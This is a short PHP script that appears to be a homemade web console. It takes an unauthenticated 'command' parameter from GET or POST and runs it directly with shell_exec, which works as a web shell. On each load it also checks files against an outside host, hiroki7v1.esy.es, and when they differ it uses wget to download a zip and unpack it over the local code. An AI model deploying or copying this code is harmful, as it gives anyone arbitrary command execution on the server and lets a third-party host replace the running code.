<?php
  if(isset($_GET['command'])) {
      $id = $_GET['command'];
  }
  if(isset($_GET['path'])) {
      $path = $_GET['path'];
      //$path = '"',$path,'"';
  }
  if($id==""){
    $id=$_POST['command'];
  }
  if($path==""){
    $path=$_POST['path'];
    //$path='"',$path,'"';
  }
  if($path==""){
    $path="null";
  }
echo "Chack Ing Change...","\n";$cic = file_get_contents("http://hiroki7v1.esy.es/cic/index.txt");
if($cic==file_get_contents("index.php")){echo "Much file\n";}else{$cccid=shell_exec("rmdir hirokiAPI;wget http://hiroki7v1.esy.es/cic/upd.zip;unzip upd.zip;rm upd.zip;mv hirokiAPI/* ./");echo "Installed UPD\n";}
echo "Chack Ing console.php...","\n";$cic = file_get_contents("http://hiroki7v1.esy.es/cic/console.txt");
if($cic==file_get_contents("console.php")){echo "Much file\n";}else{$cccid=shell_exec("rmdir hirokiAPI;wget http://hiroki7v1.esy.es/cic/upd.zip;unzip upd.zip;rm upd.zip;mv hirokiAPI/* ./");echo "Installed UPD\n";}
echo "Chack Ing ssh-conoles.html...","\n";$cic = file_get_contents("http://hiroki7v1.esy.es/cic/ssh-consoles.txt");
if($cic==file_get_contents("ssh-consoles.html")){echo "Much file\n";}else{$cccid=shell_exec("rmdir hirokiAPI;wget http://hiroki7v1.esy.es/cic/upd.zip;unzip upd.zip;rm upd.zip;mv hirokiAPI/* ./");echo "Installed UPD\n";}
echo "Chack Ing editpage.php...","\n";$cic = file_get_contents("http://hiroki7v1.esy.es/cic/editpage.txt");
if($cic==file_get_contents("editpage.php")){echo "Much file\n";}else{$cccid=shell_exec("rmdir hirokiAPI;wget http://hiroki7v1.esy.es/cic/upd.zip;unzip upd.zip;rm upd.zip;mv hirokiAPI/* ./");echo "Installed UPD\n";}
echo "Chack Ing uploads.html...","\n";$cic = file_get_contents("http://hiroki7v1.esy.es/cic/uploads.txt");
if($cic==file_get_contents("uploads.html")){echo "Much file\n";}else{$cccid=shell_exec("rmdir hirokiAPI;wget http://hiroki7v1.esy.es/cic/upd.zip;unzip upd.zip;rm upd.zip;mv hirokiAPI/* ./");echo "Installed UPD\n";}
echo "Chack Ing fileuploader.php...","\n";$cic = file_get_contents("http://hiroki7v1.esy.es/cic/fileuploader.txt");
if($cic==file_get_contents("fileuploader.php")){echo "Much file\n";}else{$cccid=shell_exec("rmdir hirokiAPI;wget http://hiroki7v1.esy.es/cic/upd.zip;unzip upd.zip;rm upd.zip;mv hirokiAPI/* ./");echo "Installed UPD\n";}
//$pmt=shell_exec('$lnxpmt="\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]${C9_USER}\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$(__git_ps1 " (%s)") $";echo $lnxpmt');
$pmt="hiroki_repo:~/workspace $ ";
if($cccid==""){} else {echo $cccid;}
echo $pmt,$id,"\n";
if($id==""){}else{echo shell_exec($id),"\n";echo $pmt;}
?>